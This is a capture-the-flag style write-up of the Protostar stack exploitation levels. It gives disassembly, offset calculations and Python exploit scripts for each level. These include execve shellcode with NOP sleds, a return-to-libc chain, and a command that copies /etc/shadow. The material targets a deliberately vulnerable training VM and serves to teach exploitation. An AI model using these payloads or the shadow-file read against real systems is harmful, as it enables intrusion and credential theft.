# Protostar

## Stack0

The source code shows that there is a significant stack overflow. When the program recvievs input from the user, gets() will not check the length of the buffer.
The mission is that overwrite the variable named modified, the address of which is just 64bytes behind the address of the variable named buffer.

```ASM
 080483f4 <main>:
 80483f4:       55                      push   %ebp
 80483f5:       89 e5                   mov    %esp,%ebp
 80483f7:       83 e4 f0                and    $0xfffffff0,%esp
 80483fa:       83 ec 60                sub    $0x60,%esp
 80483fd:       c7 44 24 5c 00 00 00    movl   $0x0,0x5c(%esp)
 8048404:       00
 8048405:       8d 44 24 1c             lea    0x1c(%esp),%eax
 8048409:       89 04 24                mov    %eax,(%esp)
 804840c:       e8 fb fe ff ff          call   804830c <gets@plt>
 8048411:       8b 44 24 5c             mov    0x5c(%esp),%eax
 8048415:       85 c0                   test   %eax,%eax
 8048417:       74 0e                   je     8048427 <main+0x33>
 8048419:       c7 04 24 00 85 04 08    movl   $0x8048500,(%esp)
 8048420:       e8 07 ff ff ff          call   804832c <puts@plt>
 8048425:       eb 0c                   jmp    8048433 <main+0x3f>
 8048427:       c7 04 24 29 85 04 08    movl   $0x8048529,(%esp)
 804842e:       e8 f9 fe ff ff          call   804832c <puts@plt>
 8048433:       c9                      leave
 8048434:       c3                      ret

```

We could calculate the offset will be 0x40 = 64, since the 
&buffer = 0x1c(%esp);
&modified = 0x5c(%esp);

The exploit python code is 

```python
#!/usr/bin/env python

SH='A'*64+'XXXX'
print(SH)
```

## Stack1

The exploit python code could be slightly modified for stack1

```python
#!/usr/bin/env python

SH='A'*64+'dcba'
print(SH)
```

## Stack2

The exploit python code is:

```python
#!/usr/bin/env python
import sys

SH='A'*64+'\x0a\x0d\x0a\x0d'
sys.stdout.write(SH)
```

And the stack overflow could be constructed as :

```shell
 env GREENIE="`python hack.py`" /opt/protostar/bin/stack2
```

## Stack3

The disasmble code is :

```asm
08048438 <main>:
 8048438:       55                      push   %ebp
 8048439:       89 e5                   mov    %esp,%ebp
 804843b:       83 e4 f0                and    $0xfffffff0,%esp
 804843e:       83 ec 60                sub    $0x60,%esp
 8048441:       c7 44 24 5c 00 00 00    movl   $0x0,0x5c(%esp)
 8048448:       00
 8048449:       8d 44 24 1c             lea    0x1c(%esp),%eax
 804844d:       89 04 24                mov    %eax,(%esp)
 8048450:       e8 db fe ff ff          call   8048330 <gets@plt>
 8048455:       83 7c 24 5c 00          cmpl   $0x0,0x5c(%esp)
 804845a:       74 1b                   je     8048477 <main+0x3f>
 804845c:       b8 60 85 04 08          mov    $0x8048560,%eax
 8048461:       8b 54 24 5c             mov    0x5c(%esp),%edx
 8048465:       89 54 24 04             mov    %edx,0x4(%esp)
 8048469:       89 04 24                mov    %eax,(%esp)
 804846c:       e8 df fe ff ff          call   8048350 <printf@plt>
 8048471:       8b 44 24 5c             mov    0x5c(%esp),%eax
 8048475:       ff d0                   call   *%eax
 8048477:       c9                      leave
 8048478:       c3                      ret
```
I plan to overwrite the content of the pointor named fp with the value of win(), the address of which is 0x08048424.

The following python code will exploit the program at the level.

```python
#!/usr/bin/env python
import sys

SH='A'*64+'\x24\x84\x04\x08'
sys.stdout.write(SH)
```

## stack4

I used `strace -i` to find out which offset is the return address, then I constructed the attack vector.

```python
#!/usr/bin/env python
import sys
padding='BBBBCCCCDDDD'
ret_addr='\xf4\x83\x04\x08'

SH='A'*64+padding+ret_addr

sys.stdout.write(SH)
```

## stack5

In this level, I found the value of esp and ebp maybe different between normal  execution and gdb mode. Also /bin/sh will read from stdin, but which was redirected by command. And strace is a good tool to debug.

`python stack5.py | /opt/protostar/bin/stack5`

```python
#!/usr/bin/env python

import sys

SHELL_CODE = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
NOP= "\x90"

ret_addr = "\xa0\xf7\xff\xbf" # 0xbffff7a0
old_ebp = "\x48\xf8\xff\xbf" #0xbffff848

buff_size = 64

# NOP shell_code NOP old_ebp ret_addr
SH = NOP*32 + SHELL_CODE
SH = SH + NOP*(buff_size-len(SH))
# and    $0xfffffff0,%esp
SH = SH + NOP*8 + old_ebp + ret_addr
# add return char for gets()
SH = SH + "\n"

sys.stdout.write(SH)
sys.stdout.flush()
#write cmd
cmd="id; cat /etc/shadow > shadow.txt"
sys.stdout.write(cmd+"\n")
sys.stdout.flush()

```

# stack6

Because the buffer of stack starts with 0xbfXXXXXX, it will be unable to put the shellcode on the stack.

The following code shows how return into libc works. Please be careful about the structure of the payload.
buffer | old_ebp | system_addr | ret_addr_after_system | parameters

```python
#!/usr/bin/env python

import sys

NOP= "\x90"

ret_addr = "\xb0\xff\xec\xb7" # 0xb7ecffb0 system
old_ebp = "\xff\xff\xff\xbf"  # 0xbfffffff
para = "\x8c\xf7\xff\xbf" # 0xbffff78c
buff_size = 0x4c
cmd="/usr/bin/id; echo "
exit_addr = "\xc0\x60\xec\xb7" # 0xb7ec60c0 exit
exit_para = "\xff\xff\xff\xff"
# cmd padding  old_ebp ret_addr
SH = cmd
SH = SH + 'A'*(buff_size-len(SH))
SH = SH + old_ebp + ret_addr + exit_addr + para
# add return char for gets()
SH = SH + "\n"

sys.stdout.write(SH)
sys.stdout.flush()
```

The second point is that, this code only check the return address at the first time. However, we can control the return address, so that we just pick a function on the return address. When this function returns, it will continue pop the next level return address, which will not be checked.

# stack 7

I chose to use the instruction, which is `jmp eax`, as the return address.
And I have updated the shellcode, because edx should be set as 0.

```python
#!/usr/bin/env python

import sys

SHELL_CODE = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
NOP= "\x90"

ret_addr = "\xeb\x85\x04\x08" # 0x080485eb jmp eax
old_ebp = "\xff\xff\xff\xbf"  # 0xbfffffff

buff_size = 0x4c

# NOP shell_code NOP old_ebp ret_addr
SH = NOP*4 + SHELL_CODE
SH = SH + NOP*(buff_size-len(SH))
SH = SH + old_ebp + ret_addr
SH = SH + "\n"
sys.stdout.write(SH)
sys.stdout.flush()

#write cmd
cmd="/usr/bin/id"
sys.stdout.write(cmd+"\n")
sys.stdout.flush()
```